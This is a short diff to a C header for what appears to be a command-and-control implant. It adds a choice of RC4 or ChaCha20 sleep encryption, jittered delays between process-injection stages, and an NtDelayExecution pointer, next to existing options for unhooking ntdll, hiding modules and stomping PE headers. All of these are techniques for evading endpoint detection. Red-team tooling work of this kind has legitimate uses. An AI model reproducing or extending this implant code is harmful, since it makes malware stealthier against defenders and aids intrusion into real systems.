@@ -154,6 +154,9 @@ typedef struct
             BOOL  UnhookNtdll;          /* TRUE = overwrite loaded ntdll .text with clean KnownDlls copy at init */
             BOOL  HideModules;          /* TRUE = unlink loaded modules from PEB LDR lists after load */
             BOOL  PeStomp;              /* TRUE = stomp PE header during sleep; FALSE = skip (safe for injection) */
+            DWORD SleepCipher;          /* SLEEP_CIPHER_RC4 (0) or SLEEP_CIPHER_CHACHA20 (1); set from config blob */
+            DWORD ExecDelay;            /* HVC-046: base delay (ms) between injection stages; 0 = disabled */
+            DWORD ExecDelayJitter;      /* HVC-046: jitter percentage applied to ExecDelay; 0 = no jitter */
         } Implant;
 
         struct {
@@ -254,6 +257,7 @@ typedef struct
         WIN_FUNC( NtQueryInformationThread )
         WIN_FUNC( NtQueryObject )
         PVOID NtTraceEvent;
+        WIN_FUNC( NtDelayExecution ) /* HVC-046: jittered delay between injection stages */
 
         // Kernel32
         WIN_FUNC( LoadLibraryW )
@@ -356,7 +360,7 @@ typedef struct
         WIN_FUNC( GetUserNameA )
         WIN_FUNC( CreateProcessWithTokenW )
         WIN_FUNC( CreateProcessWithLogonW )
-        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
+        PVOID SleepCipherFunc;  /* set in DemonInit to RC4CryptUString or ChaCha20CryptUString per profile */
         WIN_FUNC( FreeSid )
         WIN_FUNC( SetSecurityDescriptorSacl )
         WIN_FUNC( SetSecurityDescriptorDacl )
